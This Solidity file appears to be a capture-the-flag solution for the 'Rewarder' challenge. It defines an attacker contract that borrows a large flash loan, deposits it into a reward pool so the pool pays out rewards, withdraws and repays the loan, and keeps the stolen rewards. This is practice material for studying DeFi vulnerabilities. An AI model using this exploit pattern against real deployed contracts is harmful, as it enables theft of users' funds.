// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    TheRewarderPool private immutable _rewarderPool;
    FlashLoanerPool private immutable _flashLoanerPool;
    DamnValuableToken private immutable _liquidityToken;
    RewardToken public immutable _rewardToken;
    address immutable _player;

    constructor(
        TheRewarderPool rewarderPool,
        FlashLoanerPool flashLoanerPool,
        DamnValuableToken liquidityToken,
        RewardToken rewardToken
    ) {
        _rewarderPool = rewarderPool;
        _flashLoanerPool = flashLoanerPool;
        _liquidityToken = liquidityToken;
        _rewardToken = rewardToken;
        _player = msg.sender;
    }

    function attack() external {
        _flashLoanerPool.flashLoan(1000000 ether);
        // transfer the rewards to the player
        _rewardToken.transfer(_player, _rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        // approve and deposit to the reward pool
        _liquidityToken.approve(address(_rewarderPool), amount);
        _rewarderPool.deposit(amount); // deposit will trigger the distributeRewards
        // withdraw from reward pool
        _rewarderPool.withdraw(amount);
        // pay back the loan
        _liquidityToken.transfer(address(_flashLoanerPool), amount);
    }
}
